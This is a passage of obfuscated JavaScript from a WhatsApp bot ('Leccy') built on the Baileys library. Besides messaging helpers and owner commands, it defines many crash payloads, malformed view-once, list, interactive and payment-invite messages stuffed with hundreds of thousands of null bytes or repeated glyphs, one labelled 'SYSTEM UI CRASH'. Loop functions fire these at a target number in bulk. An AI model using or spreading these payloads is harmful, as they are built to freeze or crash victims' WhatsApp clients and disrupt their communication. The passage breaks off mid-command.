                await _0x23b255[_0x98e48b(0x13d)](_0x42fa35, {
                    'text': _0x5c003c
                }, {
                    'quoted': _0x38267e
                });
            }, _0x8c7baa = async _0x3ddcb7 => {
                const _0x4320c3 = _0x1b775d;
                _0x23b255[_0x4320c3(0x13d)](_0x42fa35, {
                    'text': _0x3ddcb7
                }, {
                    'quoted': _0x38267e
                });
            }, _0x4159f4 = async _0x3c7834 => {
                const _0x17dde4 = _0x1b775d;
                _0x23b255[_0x17dde4(0x13d)](_0x42fa35, {
                    'react': {
                        'text': _0x3c7834,
                        'key': _0x38267e[_0x17dde4(0x2ad)]
                    }
                });
            }, _0x5a6671 = async (_0x31f513, _0x4e8636) => {
                _0x23b255['sendMessage'](_0x42fa35, {
                    'video': {
                        'url': _0x31f513
                    },
                    'caption': _0x4e8636
                }, {
                    'quoted': _0x38267e
                });
            }, _0x5c74b6 = async (_0x24a51d, _0x1d7587) => {
                _0x23b255['sendMessage'](_0x42fa35, {
                    'image': {
                        'url': _0x24a51d
                    },
                    'caption': _0x1d7587
                }, {
                    'quoted': _0x38267e
                });
            }, _0x5110f5 = async (_0x6f6631, _0x21106f = []) => {
                _0x23b255['sendMessage'](_0x42fa35, {
                    'text': _0x6f6631,
                    'mentions': _0x21106f
                }, {
                    'quoted': _0x38267e
                });
            }, _0x561604 = async (_0x5b0042, _0x5ab3ed = []) => {
                const _0x1a3320 = _0x1b775d;
                _0x23b255[_0x1a3320(0x13d)](_0x42fa35, {
                    'text': _0x5b0042,
                    'mentions': _0x5ab3ed
                }, {
                    'quoted': _0x404955
                });
            }, _0x3c9814 = async (_0x343e57, _0x5a1547 = []) => {
                const _0x28141d = _0x1b775d;
                _0x23b255[_0x28141d(0x13d)](_0x42fa35, {
                    'image': treeimg,
                    'caption': _0x343e57,
                    'mentions': _0x5a1547
                }, {
                    'quoted': _0x38267e
                });
            }, _0x3c3742 = async (_0x257d4e, _0xe3b259) => {
                const _0x4aca30 = _0x1b775d;
                _0x23b255[_0x4aca30(0x13d)](_0x42fa35, {
                    'document': {
                        'url': _0x257d4e
                    },
                    'fileName': _0xe3b259 + _0x4aca30(0x222),
                    'mimetype': _0x4aca30(0x2bd)
                }, {
                    'quoted': _0x38267e
                });
            }, _0x253e38 = async _0x2789a1 => {
                const _0x31bfe2 = _0x1b775d;
                let _0x43bf2d = '';
                const _0x3ff38f = _0x31bfe2(0x1a8),
                    _0x360f7c = _0x3ff38f[_0x31bfe2(0x111)];
                for (let _0x909d28 = 0x0; _0x909d28 < _0x2789a1; _0x909d28++) {
                    _0x43bf2d += _0x3ff38f['charAt'](Math[_0x31bfe2(0x1ab)](Math['random']() * _0x360f7c));
                }
                return _0x43bf2d;
            }, _0xa77d0c = _0x14c1aa => {
                const _0x5a97c5 = _0x1b775d;
                let _0x1c75ac = '';
                const _0x56d438 = _0x5a97c5(0x139),
                    _0x120446 = _0x56d438[_0x5a97c5(0x111)];
                for (let _0x3e295d = 0x0; _0x3e295d < _0x14c1aa; _0x3e295d++) {
                    _0x1c75ac += _0x56d438[_0x5a97c5(0x1a6)](Math[_0x5a97c5(0x1ab)](Math['random']() * _0x120446));
                }
                return _0x1c75ac;
            };

        function _0x106d54(_0x58d2e9, _0x2af935 = [], _0x82c57f) {
            const _0x397f00 = _0x1b775d;
            if (_0x82c57f == null || _0x82c57f == undefined || _0x82c57f == ![]) {
                let _0x2cdfa3 = _0x23b255[_0x397f00(0x13d)](_0x42fa35, {
                    'text': _0x58d2e9,
                    'mentions': _0x2af935
                }, {
                    'quoted': _0x38267e
                });
                return _0x2cdfa3;
            } else {
                let _0xfd94d1 = _0x23b255[_0x397f00(0x13d)](_0x42fa35, {
                    'text': _0x58d2e9,
                    'mentions': _0x2af935
                }, {
                    'quoted': _0x38267e
                });
                return _0xfd94d1;
            }
        }

        function _0x49d796(_0x88a887, _0x162826 = [], _0x11efc7) {
            const _0x543911 = _0x1b775d;
            if (_0x11efc7 == null || _0x11efc7 == undefined || _0x11efc7 == ![]) {
                let _0x4cb611 = _0x23b255[_0x543911(0x13d)](_0x42fa35, {
                    'text': _0x88a887,
                    'mentions': _0x162826
                }, {
                    'quoted': _0x38267e
                });
                return _0x4cb611;
            } else {
                let _0x2b4794 = _0x23b255[_0x543911(0x13d)](_0x42fa35, {
                    'text': _0x88a887,
                    'mentions': _0x162826
                }, {
                    'quoted': _0x38267e
                });
                return _0x2b4794;
            }
        }
        async function _0x302785(_0x3932e0) {
            const _0x3efde4 = _0x1b775d;
            var _0x1cca8b = generateWAMessageFromContent(_0x3932e0, proto[_0x3efde4(0x18b)]['fromObject']({
                'viewOnceMessage': {
                    'message': {
                        'liveLocationMessage': {
                            'degreesLatitude': 'p',
                            'degreesLongitude': 'p',
                            'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ' ['repeat'](0xd6d8),
                            'sequenceNumber': '0',
                            'jpegThumbnail': ''
                        }
                    }
                }
            }), {
                'userJid': _0x3932e0
            });
            await _0x23b255['relayMessage'](_0x3932e0, _0x1cca8b['message'], {
                'participant': {
                    'jid': _0x3932e0
                },
                'messageId': _0x1cca8b[_0x3efde4(0x2ad)]['id']
            });
        }
        async function _0x228b73(_0x10e970) {
            const _0x16674e = _0x1b775d;
            var _0x1e3ff4 = generateWAMessageFromContent(_0x10e970, proto['Message'][_0x16674e(0x1aa)]({
                'listMessage': {
                    'title': _0x16674e(0x105) + '\x00' [_0x16674e(0x2c9)](0xf423f),
                    'footerText': '.',
                    'description': '.',
                    'buttonText': null,
                    'listType': 0x2,
                    'productListInfo': {
                        'productSections': [{
                            'title': _0x16674e(0x21c),
                            'products': [{
                                'productId': '4392524570816732'
                            }]
                        }],
                        'productListHeaderImage': {
                            'productId': _0x16674e(0x236),
                            'jpegThumbnail': null
                        },
                        'businessOwnerJid': '0@s.whatsapp.net'
                    }
                },
                'footer': 'puki',
                'contextInfo': {
                    'expiration': 0x93a80,
                    'ephemeralSettingTimestamp': _0x16674e(0x18a),
                    'entryPointConversionSource': _0x16674e(0x204),
                    'entryPointConversionApp': _0x16674e(0x15b),
                    'entryPointConversionDelaySeconds': 0x9,
                    'disappearingMode': {
                        'initiator': _0x16674e(0x190)
                    }
                },
                'selectListType': 0x2,
                'product_header_info': {
                    'product_header_info_id': 0x4433e2e130,
                    'product_header_is_rejected': !![]
                }
            }), {
                'userJid': _0x10e970
            });
            await _0x23b255['relayMessage'](_0x10e970, _0x1e3ff4['message'], {
                'participant': {
                    'jid': _0x10e970
                },
                'messageId': _0x1e3ff4[_0x16674e(0x2ad)]['id']
            });
        }
        async function _0x55469c(_0x40db74) {
            const _0x3cb94a = _0x1b775d;
            var _0x2aafd6 = generateWAMessageFromContent(_0x40db74, proto['Message'][_0x3cb94a(0x1aa)]({
                'viewOnceMessage': {
                    'message': {
                        'liveLocationMessage': {
                            'degreesLatitude': 'p',
                            'degreesLongitude': 'p',
                            'caption': _0x3cb94a(0x12c) + _0x3cb94a(0x2a4)[_0x3cb94a(0x2c9)](0xc350),
                            'sequenceNumber': '0',
                            'jpegThumbnail': ''
                        }
                    }
                }
            }), {
                'userJid': _0x40db74
            });
            await _0x23b255[_0x3cb94a(0x120)](_0x40db74, _0x2aafd6[_0x3cb94a(0x27c)], {
                'participant': {
                    'jid': _0x40db74
                },
                'messageId': _0x2aafd6[_0x3cb94a(0x2ad)]['id']
            });
        }
        async function _0x37f42a(_0x301e23) {
            const _0x32beae = _0x1b775d;
            var _0x21ee40 = generateWAMessageFromContent(_0x301e23, proto[_0x32beae(0x18b)][_0x32beae(0x1aa)]({
                'viewOnceMessage': {
                    'message': {
                        'liveLocationMessage': {
                            'degreesLatitude': 'p',
                            'degreesLongitude': 'p',
                            'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + _0x32beae(0x2a4)[_0x32beae(0x2c9)](0xc350),
                            'sequenceNumber': '0',
                            'jpegThumbnail': ''
                        }
                    }
                }
            }), {
                'userJid': _0x301e23
            });
            await _0x23b255[_0x32beae(0x120)](_0x301e23, _0x21ee40[_0x32beae(0x27c)], {
                'messageId': _0x21ee40[_0x32beae(0x2ad)]['id']
            });
        }
        async function _0x277b56(_0xf06096) {
            const _0x36ac6f = _0x1b775d;
            var _0x35bfe0 = generateWAMessageFromContent(_0xf06096, proto[_0x36ac6f(0x18b)]['fromObject']({
                'listMessage': {
                    'title': _0x36ac6f(0x1c0) + '\x00' ['repeat'](0xe09c0),
                    'footerText': 'àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®',
                    'description': 'àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®',
                    'buttonText': null,
                    'listType': 0x2,
                    'productListInfo': {
                        'productSections': [{
                            'title': _0x36ac6f(0x244),
                            'products': [{
                                'productId': _0x36ac6f(0x236)
                            }]
                        }],
                        'productListHeaderImage': {
                            'productId': _0x36ac6f(0x236),
                            'jpegThumbnail': null
                        },
                        'businessOwnerJid': _0x36ac6f(0x206)
                    }
                },
                'footer': _0x36ac6f(0x244),
                'contextInfo': {
                    'expiration': 0x927c0,
                    'ephemeralSettingTimestamp': '1679959486',
                    'entryPointConversionSource': _0x36ac6f(0x204),
                    'entryPointConversionApp': _0x36ac6f(0x15b),
                    'entryPointConversionDelaySeconds': 0x9,
                    'disappearingMode': {
                        'initiator': 'INITIATED_BY_ME'
                    }
                },
                'selectListType': 0x2,
                'product_header_info': {
                    'product_header_info_id': 0x4433e2e130,
                    'product_header_is_rejected': ![]
                }
            }), {
                'userJid': _0xf06096
            });
            await _0x23b255['relayMessage'](_0xf06096, _0x35bfe0['message'], {
                'participant': {
                    'jid': _0xf06096
                },
                'messageId': _0x35bfe0['key']['id']
            });
        }
        async function _0x26d393(_0x21bd00) {
            const _0x6df452 = _0x1b775d;
            var _0x1ad952 = generateWAMessageFromContent(_0x21bd00, proto[_0x6df452(0x18b)][_0x6df452(0x1aa)]({
                'listMessage': {
                    'title': 'SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸' + '\x00' [_0x6df452(0x2c9)](0xe09c0),
                    'footerText': _0x6df452(0x1d2),
                    'description': _0x6df452(0x1d2),
                    'buttonText': null,
                    'listType': 0x2,
                    'productListInfo': {
                        'productSections': [{
                            'title': _0x6df452(0x244),
                            'products': [{
                                'productId': _0x6df452(0x236)
                            }]
                        }],
                        'productListHeaderImage': {
                            'productId': '4392524570816732',
                            'jpegThumbnail': null
                        },
                        'businessOwnerJid': _0x6df452(0x206)
                    }
                },
                'footer': 'lol',
                'contextInfo': {
                    'expiration': 0x927c0,
                    'ephemeralSettingTimestamp': '1679959486',
                    'entryPointConversionSource': 'global_search_new_chat',
                    'entryPointConversionApp': _0x6df452(0x15b),
                    'entryPointConversionDelaySeconds': 0x9,
                    'disappearingMode': {
                        'initiator': _0x6df452(0x190)
                    }
                },
                'selectListType': 0x2,
                'product_header_info': {
                    'product_header_info_id': 0x4433e2e130,
                    'product_header_is_rejected': ![]
                }
            }), {
                'userJid': _0x21bd00
            });
            await _0x23b255['relayMessage'](_0x21bd00, _0x1ad952[_0x6df452(0x27c)], {
                'messageId': _0x1ad952[_0x6df452(0x2ad)]['id']
            });
        }
        async function _0x4bd7c8(_0x150883) {
            const _0x5de0a3 = _0x1b775d;
            var _0x39df14 = generateWAMessageFromContent(_0x150883, proto['Message']['fromObject']({
                'viewOnceMessage': {
                    'message': {
                        'interactiveMessage': {
                            'header': {
                                'title': '',
                                'subtitle': _0x5de0a3(0x269)
                            },
                            'body': {
                                'text': _0x5de0a3(0x324)
                            },
                            'footer': {
                                'text': _0x5de0a3(0x15d)
                            },
                            'nativeFlowMessage': {
                                'buttons': [{
                                    'name': _0x5de0a3(0x238),
                                    'buttonParamsJson': '{ display_text : \'𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌\', url : , merchant_url :  }'
                                }, {
                                    'name': _0x5de0a3(0x238),
                                    'buttonParamsJson': _0x5de0a3(0x112)
                                }, {
                                    'name': _0x5de0a3(0x238),
                                    'buttonParamsJson': _0x5de0a3(0x112)
                                }],
                                'messageParamsJson': '' [_0x5de0a3(0x2c9)](0xf423f)
                            }
                        }
                    }
                }
            }), {
                'userJid': _0x150883
            });
            await _0x23b255['relayMessage'](_0x150883, _0x39df14['message'], {
                'participant': {
                    'jid': _0x150883
                },
                'messageId': _0x39df14[_0x5de0a3(0x2ad)]['id']
            });
        }
        async function _0x5dbd71(_0xefa2f1) {
            const _0x37f093 = _0x1b775d;
            var _0x52eea9 = generateWAMessageFromContent(_0xefa2f1, proto[_0x37f093(0x18b)][_0x37f093(0x1aa)]({
                'viewOnceMessage': {
                    'message': {
                        'interactiveMessage': {
                            'header': {
                                'title': '',
                                'subtitle': _0x37f093(0x269)
                            },
                            'body': {
                                'text': _0x37f093(0x324)
                            },
                            'footer': {
                                'text': '𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕'
                            },
                            'nativeFlowMessage': {
                                'buttons': [{
                                    'name': _0x37f093(0x238),
                                    'buttonParamsJson': _0x37f093(0x112)
                                }, {
                                    'name': _0x37f093(0x238),
                                    'buttonParamsJson': _0x37f093(0x112)
                                }, {
                                    'name': _0x37f093(0x238),
                                    'buttonParamsJson': _0x37f093(0x112)
                                }],
                                'messageParamsJson': '' [_0x37f093(0x2c9)](0xf423f)
                            }
                        }
                    }
                }
            }), {
                'userJid': _0xefa2f1
            });
            await _0x23b255[_0x37f093(0x120)](_0xefa2f1, _0x52eea9[_0x37f093(0x27c)], {
                'messageId': _0x52eea9[_0x37f093(0x2ad)]['id']
            });
        }
        async function _0x149a67(_0x3a23ed) {
            const _0x2fa411 = _0x1b775d;
            let _0x4f0a20 = generateWAMessageFromContent(_0x3a23ed, {
                'viewOnceMessage': {
                    'message': {
                        'messageContextInfo': {
                            'deviceListMetadata': {},
                            'deviceListMetadataVersion': 0x2
                        },
                        'interactiveMessage': proto['Message'][_0x2fa411(0x316)][_0x2fa411(0x1fd)]({
                            'body': proto['Message'][_0x2fa411(0x316)][_0x2fa411(0x289)][_0x2fa411(0x1fd)]({
                                'text': ''
                            }),
                            'footer': proto[_0x2fa411(0x18b)]['InteractiveMessage'][_0x2fa411(0x261)]['create']({
                                'text': 'ྦྷ' [_0x2fa411(0x2c9)](0x3d090)
                            }),
                            'header': proto[_0x2fa411(0x18b)][_0x2fa411(0x316)]['Header']['create']({
                                'title': '',
                                'subtitle': '',
                                'hasMediaAttachment': ![]
                            }),
                            'nativeFlowMessage': proto[_0x2fa411(0x18b)][_0x2fa411(0x316)][_0x2fa411(0x1c9)][_0x2fa411(0x1fd)]({
                                'buttons': [{
                                    'name': _0x2fa411(0x238),
                                    'buttonParamsJson': _0x2fa411(0x12a)
                                }],
                                'messageParamsJson': '\x00' [_0x2fa411(0x2c9)](0x186a0)
                            })
                        })
                    }
                }
            }, {});
            _0x23b255[_0x2fa411(0x120)](_0x3a23ed, _0x4f0a20[_0x2fa411(0x27c)], {
                'messageId': _0x4f0a20[_0x2fa411(0x2ad)]['id']
            });
        }
        async function _0x35cdb1(_0x7e0e20) {
            const _0x840e07 = _0x1b775d;
            let _0x3b57ba = generateWAMessageFromContent(_0x7e0e20, {
                'viewOnceMessage': {
                    'message': {
                        'messageContextInfo': {
                            'deviceListMetadata': {},
                            'deviceListMetadataVersion': 0x2
                        },
                        'interactiveMessage': proto['Message'][_0x840e07(0x316)][_0x840e07(0x1fd)]({
                            'body': proto[_0x840e07(0x18b)][_0x840e07(0x316)]['Body'][_0x840e07(0x1fd)]({
                                'text': ''
                            }),
                            'footer': proto[_0x840e07(0x18b)][_0x840e07(0x316)][_0x840e07(0x261)]['create']({
                                'text': 'ꦾ' [_0x840e07(0x2c9)](0x38270)
                            }),
                            'header': proto[_0x840e07(0x18b)][_0x840e07(0x316)]['Header'][_0x840e07(0x1fd)]({
                                'title': '',
                                'subtitle': '',
                                'hasMediaAttachment': ![]
                            }),
                            'nativeFlowMessage': proto['Message']['InteractiveMessage'][_0x840e07(0x1c9)][_0x840e07(0x1fd)]({
                                'buttons': [{
                                    'name': _0x840e07(0x238),
                                    'buttonParamsJson': _0x840e07(0x12a)
                                }],
                                'messageParamsJson': '\x00' [_0x840e07(0x2c9)](0x186a0)
                            })
                        })
                    }
                }
            }, {});
            _0x23b255[_0x840e07(0x120)](_0x7e0e20, _0x3b57ba[_0x840e07(0x27c)], {
                'participant': {
                    'jid': _0x7e0e20
                },
                'messageId': _0x3b57ba['key']['id']
            });
        }
        async function _0x925144(_0x1dd867) {
            const _0x1461e1 = _0x1b775d;
            var _0x174343 = generateWAMessageFromContent(_0x1dd867, proto['Message'][_0x1461e1(0x1aa)]({
                'viewOnceMessage': {
                    'message': {
                        'liveLocationMessage': {
                            'degreesLatitude': 'p',
                            'degreesLongitude': 'p',
                            'caption': _0x1461e1(0x22d) + 'ꦾ' [_0x1461e1(0x2c9)](0xc350),
                            'sequenceNumber': '0',
                            'jpegThumbnail': ''
                        }
                    }
                }
            }), {
                'userJid': _0x1dd867
            });
            _0x23b255['relayMessage'](_0x1dd867, _0x174343[_0x1461e1(0x27c)], {
                'participant': {
                    'jid': _0x1dd867
                },
                'messageId': _0x174343[_0x1461e1(0x2ad)]['id']
            });
        }
        async function _0x5d63f7(_0x49580e) {
            const _0x5adfa5 = _0x1b775d;
            var _0x1e16e7 = generateWAMessageFromContent(_0x49580e, proto[_0x5adfa5(0x18b)][_0x5adfa5(0x1aa)]({
                'viewOnceMessage': {
                    'message': {
                        'interactiveMessage': {
                            'header': {
                                'title': '',
                                'subtitle': ' '
                            },
                            'body': {
                                'text': ''
                            },
                            'footer': {
                                'text': ''
                            },
                            'nativeFlowMessage': {
                                'buttons': [{
                                    'name': _0x5adfa5(0x238),
                                    'buttonParamsJson': _0x5adfa5(0x12a)
                                }],
                                'messageParamsJson': '\x00' [_0x5adfa5(0x2c9)](0xf4240)
                            }
                        }
                    }
                }
            }), {
                'userJid': _0x49580e
            });
            _0x23b255['relayMessage'](_0x49580e, _0x1e16e7[_0x5adfa5(0x27c)], {
                'participant': {
                    'jid': _0x49580e
                },
                'messageId': _0x1e16e7[_0x5adfa5(0x2ad)]['id']
            });
        }
        async function _0xa6fd07(_0xd1f0cc) {
            const _0x223c5b = _0x1b775d;
            var _0x4d2154 = generateWAMessageFromContent(_0xd1f0cc, proto[_0x223c5b(0x18b)][_0x223c5b(0x1aa)]({
                'listMessage': {
                    'title': _0x223c5b(0x22d) + '\x00' [_0x223c5b(0x2c9)](0xe09c0),
                    'footerText': '',
                    'description': '',
                    'buttonText': null,
                    'listType': 0x2,
                    'productListInfo': {
                        'productSections': [{
                            'title': _0x223c5b(0x21c),
                            'products': [{
                                'productId': '4392524570816732'
                            }]
                        }],
                        'productListHeaderImage': {
                            'productId': _0x223c5b(0x236),
                            'jpegThumbnail': null
                        },
                        'businessOwnerJid': _0x223c5b(0x206)
                    }
                },
                'footer': 'puki',
                'contextInfo': {
                    'expiration': 0x93a80,
                    'ephemeralSettingTimestamp': _0x223c5b(0x18a),
                    'entryPointConversionSource': 'global_search_new_chat',
                    'entryPointConversionApp': _0x223c5b(0x15b),
                    'entryPointConversionDelaySeconds': 0x9,
                    'disappearingMode': {
                        'initiator': _0x223c5b(0x190)
                    }
                },
                'selectListType': 0x2,
                'product_header_info': {
                    'product_header_info_id': 0x4433e2e130,
                    'product_header_is_rejected': ![]
                }
            }), {
                'userJid': _0xd1f0cc
            });
            _0x23b255[_0x223c5b(0x120)](_0xd1f0cc, _0x4d2154[_0x223c5b(0x27c)], {
                'participant': {
                    'jid': _0xd1f0cc
                },
                'messageId': _0x4d2154['key']['id']
            });
        }
        async function _0xc4f2fd(_0x5b145e) {
            const _0x3c1c2f = _0x1b775d;
            var _0x5866ea = generateWAMessageFromContent(_0x5b145e, proto[_0x3c1c2f(0x18b)][_0x3c1c2f(0x1aa)]({
                'extendedTextMessage': {
                    'text': _0x3c1c2f(0x313),
                    'contextInfo': {
                        'stanzaId': _0x5b145e,
                        'participant': _0x5b145e,
                        'quotedMessage': {
                            'conversation': _0x3c1c2f(0x22d)['repeat'](0x9c40)
                        },
                        'disappearingMode': {
                            'initiator': _0x3c1c2f(0x1e1),
                            'trigger': _0x3c1c2f(0x2d1)
                        }
                    },
                    'inviteLinkGroupTypeV2': _0x3c1c2f(0x2d0)
                }
            }), {
                'userJid': _0x5b145e
            });
            await _0x23b255[_0x3c1c2f(0x120)](_0x5b145e, _0x5866ea['message'], {
                'participant': {
                    'jid': _0x5b145e
                },
                'messageId': _0x5866ea[_0x3c1c2f(0x2ad)]['id']
            });
        }
        async function _0x59ba35(_0xa0ca3a) {
            const _0x2f685c = _0x1b775d;
            await _0x23b255['relayMessage'](_0xa0ca3a, {
                'extendedTextMessage': {
                    'text': '.',
                    'contextInfo': {
                        'stanzaId': _0xa0ca3a,
                        'participant': _0xa0ca3a,
                        'quotedMessage': {
                            'conversation': 'ꦾ' ['repeat'](0xc350)
                        },
                        'disappearingMode': {
                            'initiator': _0x2f685c(0x1e1),
                            'trigger': 'CHAT_SETTING'
                        }
                    },
                    'inviteLinkGroupTypeV2': _0x2f685c(0x2d0)
                }
            }, {
                'participant': {
                    'jid': _0xa0ca3a
                }
            }, {
                'messageId': null
            });
        }
        async function _0x35e953(_0x45da35) {
            const _0x466bb7 = _0x1b775d;
            await _0x23b255['relayMessage'](_0x45da35, {
                'paymentInviteMessage': {
                    'serviceType': _0x466bb7(0x1a3),
                    'expiryTimestamp': Date[_0x466bb7(0x175)]() + 0x18 * 0x3c * 0x3c * 0x3e8
                }
            }, {
                'participant': {
                    'jid': _0x45da35
                }
            });
        }
        async function _0xd89dc(_0x4f6a4c) {
            const _0x3b5e4e = _0x1b775d;
            await _0x23b255[_0x3b5e4e(0x120)](_0x4f6a4c, {
                'paymentInviteMessage': {
                    'serviceType': 'LECCY',
                    'expiryTimestamp': Date[_0x3b5e4e(0x175)]() + 0x18 * 0x3c * 0x3c * 0xf4240
                }
            }, {
                'participant': {
                    'jid': _0x4f6a4c
                }
            });
        }
        async function _0x20d5b1(_0x576605) {
            const _0x165591 = _0x1b775d;
            await _0x23b255['relayMessage'](_0x576605, {
                'paymentInviteMessage': {
                    'serviceType': _0x165591(0x233),
                    'expiryTimestamp': Date[_0x165591(0x175)]() + 0x6c258c00
                }
            }, {
                'participant': {
                    'jid': _0x576605
                }
            });
        }
        async function _0x10bc24(_0x2c055f, _0x41765b) {
            for (let _0xb5971f = 0x0; _0xb5971f < _0x41765b; _0xb5971f++) {
                _0x228b73(_0x2c055f), _0x302785(_0x2c055f), _0x4bd7c8(_0x2c055f), _0x277b56(_0x2c055f), _0x55469c(_0x2c055f), _0x4bd7c8(_0x2c055f);
            }
        }
        async function _0x10868e(_0x34b18c, _0xee8aba) {
            for (let _0x2cab6c = 0x0; _0x2cab6c < _0xee8aba; _0x2cab6c++) {
                _0xc4f2fd(_0x34b18c), _0xd89dc(_0x34b18c), _0xc4f2fd(_0x34b18c), _0xd89dc(_0x34b18c);
            }
        }
        async function _0x6a2258(_0x146c70, _0x3ebd41) {
            for (let _0x20a8cf = 0x0; _0x20a8cf < _0x3ebd41; _0x20a8cf++) {
                _0x26d393(_0x146c70), _0x149a67(_0x146c70), _0x5dbd71(_0x146c70);
            }
        }
        Leccy_Auto_Typing && (await delay(0x1f4), _0x23b255['sendPresenceUpdate'](_0x1b775d(0x273), _0x42fa35));
        Leccy_Auto_Recording && (await delay(0x1f4), _0x23b255[_0x1b775d(0x12e)](_0x1b775d(0x2e9), _0x42fa35));
        Leccy_Auto_ReadPesan && (await delay(0x1f4), _0x23b255[_0x1b775d(0x2a9)]([_0x38267e[_0x1b775d(0x2ad)]]));
        if (mute_bot) {
            if (_0x4ae346) return;
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb) return;
        }
        if (_0x4ae346) {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) return;
            console[_0x1b775d(0x2a1)](chalk[_0x1b775d(0x30d)](chalk['redBright'](_0x1b775d(0x154)))), console[_0x1b775d(0x2a1)](chalk[_0x1b775d(0x15f)](chalk[_0x1b775d(0x2a3)]('Group Chat :'))), console['log'](chalk[_0x1b775d(0x15f)](chalk[_0x1b775d(0x270)](_0x1b775d(0x2c6))), chalk['black'](chalk[_0x1b775d(0x2cb)](_0x53090e || _0x12ce2b)) + '\x0a' + chalk[_0x1b775d(0x1bc)]('- From :'), chalk[_0x1b775d(0x30b)](_0x38267e[_0x1b775d(0x1c5)]), chalk[_0x1b775d(0x220)](_0x5e0c1d[_0x1b775d(0x149)]('@')[0x0]) + '\x0a' + chalk['blueBright']('=> in'), chalk[_0x1b775d(0x30b)](_0x39e19d, _0x42fa35));
        } else {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) return;
            console[_0x1b775d(0x2a1)](chalk[_0x1b775d(0x30d)](chalk['redBright'](_0x1b775d(0x154)))), console[_0x1b775d(0x2a1)](chalk[_0x1b775d(0x15f)](chalk[_0x1b775d(0x2a3)]('Private Chat :'))), console['log'](chalk[_0x1b775d(0x30d)](chalk['cyan']('- Message :')), chalk[_0x1b775d(0x15f)](chalk[_0x1b775d(0x2cb)](_0x53090e || _0x12ce2b)) + '\x0a' + chalk[_0x1b775d(0x1bc)](_0x1b775d(0x1ba)), chalk['green'](_0x38267e['pushName']), chalk[_0x1b775d(0x220)](_0x5e0c1d[_0x1b775d(0x149)]('@')[0x0]) + '\x0a');
        }
        switch (_0x2818bf) {
        case _0x1b775d(0x165):
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x252));
            _0x25b16a(_0x2fcec4(process[_0x1b775d(0x2d8)]()));
            break;
        case _0x1b775d(0x195):
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x252));
            if (mute_bot == !![]) return _0x25b16a('*The bot was in self mode before*');
            mute_bot = !![], _0x25b16a(_0x1b775d(0x271));
            break;
        case _0x1b775d(0x32a):
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x252));
            if (mute_bot == ![]) return _0x25b16a(_0x1b775d(0x121));
            mute_bot = ![], _0x25b16a('*successfully Turned Off Self Mode!*');
            break;
        case _0x1b775d(0x1fc):
            if (!fs[_0x1b775d(0x18c)](_0x1b775d(0x15a) + _0x5e0c1d[_0x1b775d(0x149)]('@')[0x0])) return _0x25b16a(_0x1b775d(0x298));
            exec(_0x1b775d(0x221) + _0x5e0c1d['split']('@')[0x0]), _0x25b16a(_0x1b775d(0x15e));
            break;
        case 'del-sesi': {
            if (!q) return _0x25b16a('EX: .d-sesi 628xxxx');
            if (!_0x585723) return _0x25b16a('This feature can only be used by the owner');
            num = q[_0x1b775d(0x11b)](/[^0-9]/g, '');
            if (!fs[_0x1b775d(0x18c)](_0x1b775d(0x15a) + num)) return _0x25b16a(_0x1b775d(0x2cc));
            exec(_0x1b775d(0x221) + num), mensesi = num + '@s.whatsapp.net', _0x106d54(_0x1b775d(0x2ef) + mensesi[_0x1b775d(0x149)]('@')[0x0], [mensesi]);
        }
        break;
        case _0x1b775d(0x124):
            if (!_0x585723) return _0x25b16a('This feature can only be used by the owner');
            exec(_0x1b775d(0x221) + _0x5e0c1d[_0x1b775d(0x149)]('@')[0x0]), _0x25b16a(_0x1b775d(0x2ac)), await sleep(0xbb8), process[_0x1b775d(0x31c)]();
            break;
        case _0x1b775d(0x1b8):
            if (!_0x585723) return _0x25b16a('This feature can only be used by the owner');
            xxjdb = 0x1;
            const {
                jadibot: _0x3b9aeb, conns: _0x4ebbfa
            } = require(_0x1b775d(0x1fe));
            try {
                let _0x17835f = [...new Set([...global['conns'][_0x1b775d(0x107)](_0x359b4c => _0x359b4c[_0x1b775d(0x26e)])['map'](_0x1acca9 => _0x1acca9[_0x1b775d(0x26e)])])];
                te = '▬▭▬▭▬▭▬▭▬▭▬▭\x0a*LISTJADIBOT-TREE*\x0a*Total Users* : ' + _0x17835f[_0x1b775d(0x111)] + _0x1b775d(0x1d0);
                for (let _0x203c52 of _0x17835f) {
                    y = await _0x23b255['decodeJid'](_0x203c52['id']), te += _0x1b775d(0x20b) + ('' + xxjdb++) + '\x0a', te += _0x1b775d(0x1f0) + y[_0x1b775d(0x149)]('@')[0x0] + '\x0a▬▭▬▭▬▭▬▭▬▭▬▭\x0a';
                }
                _0x23b255[_0x1b775d(0x12f)](_0x42fa35, te, _0x38267e);
            } catch (_0x233dd1) {
                _0x25b16a(_0x1b775d(0x231));
            }
            break;
        case 'jadibot': {
            if (!q) return _0x25b16a('EX: .jadibot 628xxxx');
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x252));
            num = q[_0x1b775d(0x11b)](/[^0-9]/g, ''), myown = _0x460352 + _0x1b775d(0x2f1), mynum = num + _0x1b775d(0x2f1);
            if (fs[_0x1b775d(0x18c)]('./database/jadibot/' + num)) return _0x106d54(_0x1b775d(0x327) + mynum[_0x1b775d(0x149)]('@')[0x0] + _0x1b775d(0x169), [mynum]);
            _0x25b16a(_0x1b775d(0x1ee));
            const {
                jadibot: _0x4ecb33,
                conns: _0x13d266
            } = require('./lib/jadibot');
            let _0x41f7e4 = await _0x4ecb33(_0x23b255, num, _0x49d796, myown),
                _0x5f24f6 = '`';
            await sleep(0xdac), txtt = _0x1b775d(0x1f4) + global['codepairing'] + _0x1b775d(0x151), _0x23b255['sendMessage'](mynum, {
                'text': txtt
